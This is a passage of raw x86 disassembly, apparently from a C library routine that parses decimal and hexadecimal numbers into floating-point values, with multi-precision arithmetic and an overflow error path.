mov dword [var_180h], edx
mov esi, dword [var_180h]
mov dword [var_16ch], 0
sub esi, dword [var_184h]
sub esi, ebx
mov ebx, 1
mov dword [var_1d8h], esi
test dword [var_1d8h], ebx
je 0x8088af4
mov eax, dword [var_16ch]
xor dword [var_1d8h], ebx
test eax, eax
jne 0x80895b4
mov eax, dword [var_1e8h]
mov edi, dword [var_1e0h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_16ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1d8h]
add ebx, ebx
add dword [var_1e8h], 0x10
test eax, eax
jne 0x8088aac
lea eax, [var_ach]
cmp dword [var_1e0h], eax
je 0x8089598
mov edx, dword [var_190h]
mov esi, dword [var_18ch]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_160h]
mov esi, dword [var_184h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_180h], esi
mov edx, dword [var_174h]
lea ecx, [var_ach]
mov eax, dword [var_180h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08087f00
mov ecx, dword [var_16ch]
bsr eax, dword [ebp + ecx*4 - 0x150]
mov ebx, eax
xor ebx, 0x1f
jle 0x8088be2
lea esi, [var_14ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_160h]
lea edx, [var_ach]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8088be2
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], edx
inc eax
mov dword [var_160h], eax
cmp dword [var_16ch], 1
mov esi, dword [var_170h]
mov dword [var_15ch], esi
je 0x8089440
cmp dword [var_16ch], 2
je 0x8089139
mov eax, dword [var_16ch]
mov ecx, dword [var_16ch]
mov dword [var_200h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x154]
mov esi, dword [ebp + eax*4 - 0x150]
mov eax, dword [var_160h]
mov dword [var_1fch], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x14c]
mov dword [var_4h], eax
lea eax, [var_ach]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8088c75
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], 0
inc eax
mov dword [var_160h], eax
mov eax, dword [var_160h]
cmp eax, dword [var_16ch]
jge 0x8089117
mov edx, dword [var_16ch]
sub edx, eax
mov dword [var_204h], edx
mov edx, dword [var_170h]
test edx, edx
jle 0x80890c0
mov eax, dword [var_204h]
shl eax, 5
add eax, dword [var_170h]
cmp eax, 0x35
jg 0x8088ff7
mov ecx, dword [var_160h]
mov eax, dword [var_158h]
mov dword [var_158h], 0
test ecx, ecx
mov dword [var_154h], eax
jle 0x8088cf7
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x8088cdb
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8088d14
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x8088d04
shl dword [var_204h], 5
mov edx, dword [var_204h]
add dword [var_170h], edx
mov eax, dword [var_16ch]
cmp dword [var_170h], 0x35
mov dword [ebp + eax*4 - 0x14c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0xac]
mov ebx, eax
jg 0x8088ebf
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_210h], ecx
mov dword [var_20ch], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8088dc0
mov edx, dword [var_16ch]
mov eax, dword [ebp + edx*4 - 0xb0]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1fch]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8088fd9
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8088dc0
cmp ebx, dword [var_1fch]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1fch]
cmp edx, ecx
ja 0x8088d92
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
mov edx, dword [var_210h]
lea ecx, [var_14ch]
lea eax, [var_ach]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_16ch]
cmp dword [ebp + edx*4 - 0xac], eax
je 0x8088e16
lea eax, [var_ach]
lea ecx, [var_14ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_16ch]
mov edx, dword [var_20ch]
mov eax, dword [ebp + ecx*4 - 0xb0]
test edx, edx
mov dword [ebp + ecx*4 - 0xac], eax
mov ebx, eax
jle 0x8088e49
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8088e36
mov eax, dword [var_170h]
test eax, eax
jne 0x8088f4c
test edi, edi
mov edx, 0x20
je 0x8088e66
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8088f2c
add edx, 0x35
mov eax, edi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_200h], edx
shr eax, cl
mov dword [var_158h], eax
mov ecx, dword [var_214h]
cmp ecx, 0x35
mov dword [var_170h], ecx
jle 0x8088d62
mov esi, dword [var_16ch]
mov eax, dword [ebp + esi*4 - 0xac]
test eax, eax
mov edx, dword [var_16ch]
jne 0x8088edd
test edx, edx
js 0x8088edd
dec edx
mov ebx, dword [ebp + edx*4 - 0xac]
test ebx, ebx
jne 0x8088edd
test edx, edx
jns 0x8088ecd
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8088eed
test edx, edx
js 0x8088ef2
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_158h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_200h]
mov dword [var_10h], eax
mov eax, dword [var_164h]
mov dword [var_8h], eax
mov eax, dword [var_15ch]
dec eax
mov dword [var_4h], eax
jmp 0x808894e
neg edx
mov dword [var_154h], 0
mov dword [var_158h], edi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x8088e9d
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x8088f77
mov eax, dword [var_158h]
mov dword [var_158h], edi
mov dword [var_154h], eax
jmp 0x8088e9d
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
mov eax, dword [var_200h]
test eax, eax
jle 0x8088e9d
mov ecx, dword [var_200h]
lea eax, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_200h]
shr eax, cl
or dword [var_158h], eax
jmp 0x8088e9d
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
jmp 0x8088dc0
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
cmp dword [var_200h], 0x1f
jle 0x8089083
mov ebx, dword [var_200h]
mov ecx, dword [var_200h]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_200h], 0xffffffff
cmovg ebx, dword [var_200h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_158h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8088d14
lea edx, [ebp + eax*4 - 0x158]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8089072
jmp 0x8088d14
mov eax, dword [var_200h]
test eax, eax
jle 0x8088d14
mov edx, dword [var_200h]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8088d14
lea esi, [esi]
test eax, eax
mov ecx, eax
jle 0x80890e2
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x80890c6
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x80890ff
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x80890ef
shl dword [var_204h], 5
mov edx, dword [var_204h]
sub dword [var_15ch], edx
jmp 0x8088d27
test eax, eax
mov edx, eax
jle 0x8088d27
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8089121
jmp 0x8088d27
cmp dword [var_160h], 1
mov eax, dword [var_148h]
mov dword [var_1f4h], 0
mov dword [var_1f8h], 0
mov edi, dword [var_14ch]
mov dword [var_1f0h], eax
jle 0x8089389
mov esi, dword [var_a8h]
mov ebx, dword [var_ach]
cmp dword [var_170h], 0x35
jg 0x808924d
cmp esi, dword [var_1f0h]
je 0x8089355
mov eax, ebx
mov edx, esi
div dword [var_1f0h]
mov ecx, edx
mov dword [var_1f4h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x80891b3
jne 0x80891cc
test ebx, ebx
je 0x80891cc
add ecx, dword [var_1f0h]
dec dword [var_1f4h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_1f0h]
jae 0x80891a9
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_170h]
test eax, eax
jne 0x80892be
mov eax, dword [var_1f4h]
mov edx, 0x20
test eax, eax
je 0x80891fd
bsr edx, dword [var_1f4h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8089298
mov eax, dword [ebp - 0x1f4]
add edx, 0x35
mov dword [ebp - 0x214], 0x56
sub ecx, edx
mov dword [ebp - 0x1f8], edx
shr eax, cl
mov dword [ebp - 0x158], eax
mov eax, dword [ebp - 0x214]
cmp eax, 0x35
mov dword [ebp - 0x170], eax
jle 0x8089185
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8089261
test esi, esi
jne 0x8089261
test ebx, ebx
je 0x8089266
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1f4h]
mov eax, 0x1f
sub eax, dword [var_1f8h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_8h], ecx
jmp 0x8088940
mov ecx, dword [ebp - 0x1f4]
neg edx
mov dword [ebp - 0x154], 0
add edx, 0x20
mov dword [ebp - 0x214], edx
mov dword [ebp - 0x158], ecx
jmp 0x8089238
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x80892ef
mov eax, dword [var_158h]
mov edx, dword [var_1f4h]
mov dword [var_154h], eax
mov dword [var_158h], edx
jmp 0x8089238
mov dword [var_1f8h], 0x35
mov ecx, dword [var_170h]
sub dword [var_1f8h], ecx
mov eax, dword [var_1f8h]
test eax, eax
jle 0x8089238
mov eax, dword [ebp - 0x1f8]
lea edx, [ebp - 0x158]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1f4]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1f8]
shr eax, cl
or dword [ebp - 0x158], eax
jmp 0x8089238
lea ecx, [esi + ebx]
mov dword [var_1f4h], 0xffffffff
cmp ecx, esi
jb 0x8089379
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x80891a9
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x80891d6
mov eax, dword [var_ach]
cmp eax, dword [var_1f0h]
jb 0x80893a0
xor esi, esi
mov ebx, eax
jmp 0x8089178
mov ecx, dword [var_170h]
test ecx, ecx
jle 0x8089429
mov ebx, dword [var_170h]
add ebx, 0x20
cmp ebx, 0x35
jg 0x80893e3
mov eax, dword [var_158h]
mov dword [var_158h], 0
mov dword [var_154h], eax
mov eax, dword [var_ach]
mov dword [var_170h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x8089178
mov dword [var_1f8h], 0x35
mov edx, dword [var_170h]
sub dword [var_1f8h], edx
mov edx, dword [var_1f8h]
test edx, edx
jle 0x80893d4
mov ecx, dword [var_1f8h]
lea esi, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x80893ce
mov ebx, dword [var_170h]
sub ebx, 0x20
mov dword [var_15ch], ebx
jmp 0x80893da
lea esi, [esi]
mov dword [var_1ech], 0
mov ebx, dword [var_ach]
mov edi, dword [var_14ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_170h]
test eax, eax
jne 0x808950b
test esi, esi
mov edx, 0x20
je 0x808947d
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x80894ee
add edx, 0x35
mov eax, esi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_1ech], edx
shr eax, cl
mov dword [var_158h], eax
mov edx, dword [var_214h]
cmp edx, 0x35
mov dword [var_170h], edx
jle 0x8089456
mov edi, dword [var_1dch]
xor eax, eax
test edi, edi
jne 0x80894d1
test ebx, ebx
je 0x80894d6
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_1ech]
jmp 0x808927f
neg edx
mov dword [var_154h], 0
mov dword [var_158h], esi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x80894b0
mov ecx, dword [var_170h]
add ecx, 0x20
cmp ecx, 0x35
mov dword [var_214h], ecx
jg 0x8089536
mov eax, dword [var_158h]
mov dword [var_158h], esi
mov dword [var_154h], eax
jmp 0x80894b0
mov dword [var_1ech], 0x35
mov eax, dword [var_170h]
sub dword [var_1ech], eax
mov eax, dword [var_1ech]
test eax, eax
jle 0x80894b0
mov edx, dword [var_1ech]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_1ech]
shr eax, cl
or dword [var_158h], eax
jmp 0x80894b0
mov ecx, dword [var_16ch]
lea edi, [var_14ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088b19
mov edx, dword [var_1e8h]
mov ecx, dword [var_16ch]
mov esi, dword [var_1e0h]
mov dword [var_10h], ecx
mov ecx, dword [var_1e4h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_1e0h]
mov esi, dword [var_1e8h]
mov edx, dword [var_16ch]
add edx, dword [esi + 4]
mov esi, dword [var_1e4h]
mov dword [var_1e4h], edi
mov dword [var_1e0h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_16ch], edx
jmp 0x8088af4
mov dword [ebp + eax*4 - 0x158], 0
jmp 0x8088a15
mov eax, dword [var_170h]
mov edx, dword [var_170h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_1d4h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x14
je 0x8089765
cmp edx, 0x13
jg 0x80896ff
mov ecx, dword [var_1c0h]
mov eax, 0x14
mov ebx, 2
sub eax, edx
lea esi, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80896b9
mov ecx, dword [var_164h]
mov esi, dword [var_1d4h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_158h]
mov dword [esp], eax
jmp 0x808894e
lea eax, [edx - 0x14]
lea edi, [var_158h]
lea edx, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_1c0h]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_1c0h]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_160h]
test edx, edx
mov dword [ebp + edx*4 - 0x158], eax
jle 0x80896c5
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x8089754
jmp 0x80896c5
mov eax, 2
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
mov edi, eax
sub edi, dword [var_1c0h]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x158]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80897a2
jmp 0x80896c5
mov ecx, dword [var_160h]
lea edi, [var_ach]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088829
mov dword [var_10h], edx
mov ecx, dword [var_1b4h]
mov dword [var_8h], esi
mov edx, dword [var_1bch]
mov dword [var_ch], ecx
mov ecx, dword [var_1b8h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x80887c4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8088385
mov ecx, dword [var_184h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x80886aa
mov eax, ecx
jmp 0x80886aa
mov eax, dword [var_174h]
mov ecx, dword [arg_14h]
mov dword [var_1b0h], 1
mov esi, 0x14
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089868
inc dword [var_174h]
mov eax, dword [var_174h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808984f
cmp dl, 0x30
je 0x8089a26
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8089a0f
inc dword [var_174h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6160]
dec dword [var_180h]
mov dword [var_170h], eax
mov eax, esi
sub eax, dword [var_170h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_170h]
mov dword [var_154h], edx
mov edx, dword [var_184h]
lea eax, [ecx + edx*4]
add eax, dword [var_15ch]
lea ebx, [eax - 5]
mov eax, dword [var_180h]
mov dword [var_15ch], ebx
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
lea ebx, [ebp + eax*4 - 0x158]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089909
mov eax, dword [var_198h]
add ecx, eax
mov dword [var_174h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x80899f8
inc dword [var_174h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808999f
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_180h]
mov eax, dword [var_180h]
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
test eax, eax
jns 0x80898e5
mov ebx, dword [var_1b0h]
test ebx, ebx
jle 0x808996e
lea edx, [var_158h]
mov eax, dword [var_1b0h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8089962
mov esi, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x80896f1
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_1b0h]
js 0x80899c7
mov dword [ebx], edx
add esi, 0x1c
jmp 0x8089932
xor eax, eax
mov ecx, dword [var_164h]
mov dword [var_10h], 0x1f
cmp dword [var_180h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_15ch]
jmp 0x8088941
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089920
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089888
inc dword [var_174h]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x8089a26
jmp 0x8089871
mov eax, dword [var_188h]
mov edx, dword [var_15ch]
shl eax, 2
sub edx, eax
jmp 0x808866a
test al, al
jne 0x8088602
jmp 0x808863f
mov ecx, dword [var_18ch]
movzx eax, byte [ecx + 1]
jmp 0x8089a55
mov edx, dword [arg_ch]
test edx, edx
jne 0x8088380
jmp 0x8088385
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x8088385
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x8088385
mov eax, dword [var_18ch]
movzx eax, byte [eax]
mov byte [var_206h], al
mov edx, dword [var_180h]
xor eax, eax
test edx, edx
mov dword [var_184h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_206h], 0
mov dword [var_188h], eax
je 0x8089e22
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8089aeb
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089ad7
test al, al
jne 0x8089e1b
add edi, dword [var_198h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089ddd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8089b34
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp dword [var_188h], 0xffffffff
cmovne eax, dword [var_188h]
mov dword [var_188h], eax
inc dword [var_180h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089b0d
cmp dword [var_168h], 0x10
mov edx, esi
movsx eax, dl
jne 0x8089b60
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
cmp dword [var_168h], 0x10
mov dword [var_17ch], edi
je 0x8089dd4
cmp dword [ecx + eax*4], 0x65
je 0x8089c61
mov esi, dword [var_184h]
cmp dword [var_180h], esi
jle 0x8089b9b
mov eax, dword [var_17ch]
cmp byte [eax - 1], 0x30
je 0x8089c44
mov ecx, dword [var_184h]
cmp dword [var_180h], ecx
jne 0x808859b
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x808859b
mov ebx, dword [var_15ch]
test ebx, ebx
jns 0x808859b
cmp dword [var_168h], 0x10
je 0x8089c28
mov eax, dword [var_17ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x8089c20
cmp cl, 0x30
jne 0x808859b
dec dword [var_180h]
inc ebx
dec dword [var_17ch]
mov ecx, dword [var_180h]
dec dword [var_184h]
mov dword [var_15ch], ebx
test ecx, ecx
jle 0x808859b
test ebx, ebx
js 0x8089bc9
jmp 0x808859b
dec dword [var_17ch]
jmp 0x8089bc9
mov esi, dword [var_17ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x8089be7
jmp 0x8089c20
dec dword [var_17ch]
dec dword [var_180h]
mov edx, dword [var_17ch]
cmp byte [edx - 1], 0x30
je 0x8089c44
jmp 0x8089b9b
inc edi
mov dword [var_1ach], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8089dc8
cmp al, 0x2b
je 0x8089dbf
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089db4
cmp dword [var_168h], 0x10
je 0x8089d81
mov eax, dword [var_1ach]
test eax, eax
je 0x8089d6a
mov edx, dword [var_184h]
add edx, 0x168
mov eax, dword [var_15ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_15ch], ebx
jg 0x8089cfe
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_15ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089cb3
mov esi, dword [var_1ach]
test esi, esi
je 0x8089b7d
neg ebx
mov dword [var_15ch], ebx
jmp 0x8089b7d
cmp dword [var_188h], 0xffffffff
je 0x8089d58
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_1ach]
test eax, eax
jne 0x8089d54
mov eax, dword [var_164h]
test eax, eax
je 0x8089d4c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x8089d2c
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x8089d2c
fldz
jmp 0x8089d2c
mov eax, dword [var_164h]
test eax, eax
je 0x8089d54
fld dword [0x80a6104]
jmp 0x8089d2c
mov eax, dword [var_188h]
sub eax, dword [var_184h]
lea edx, [eax + 0x134]
jmp 0x8089cb3
mov eax, dword [var_1ach]
mov ecx, dword [var_184h]
test eax, eax
lea edx, [ecx*4 + 0x432]
jne 0x8089cb3
mov edx, dword [var_188h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x400]
jmp 0x8089cb3
mov edi, dword [var_17ch]
jmp 0x8089b7d
inc edi
movzx esi, byte [edi]
jmp 0x8089c81
mov dword [var_1ach], 1
jmp 0x8089dbf
cmp dword [ecx + eax*4], 0x70
jmp 0x8089b77
cmp dword [var_168h], 0x10
je 0x8089df6
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x8089b60
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
jmp 0x8089b60
mov edx, esi
movsx eax, dl
jmp 0x8089deb
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
jmp 0x8089aeb
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x80884e6
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80884ab
cmp eax, 0x66
ja 0x80884ab
mov esi, esi
inc dword [var_180h]
jmp 0x80884e0
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8089e87
cmp dl, byte [ecx + 0x198]
jle 0x8088483
xor ebx, ebx
cmp byte [var_205h], 0
je 0x8088483
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8088483
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089e9f
jmp 0x8088483
lea esi, [esi]
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x808846b
mov ecx, esi
cmp cl, 0x30
jne 0x808846f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8089ed9
jmp 0x808846f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x8088414
add edi, 2
mov dword [var_168h], 0x10
movzx esi, byte [edi]
mov dword [var_194h], 0
jmp 0x8088414
test al, al
jne 0x808823d
jmp 0x808822d
mov edx, dword [var_18ch]
movzx eax, byte [edx]
jmp 0x8089f1b
inc edi
movzx esi, byte [edi]
jmp 0x80881f4
mov dword [var_164h], 1
jmp 0x8089f33
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
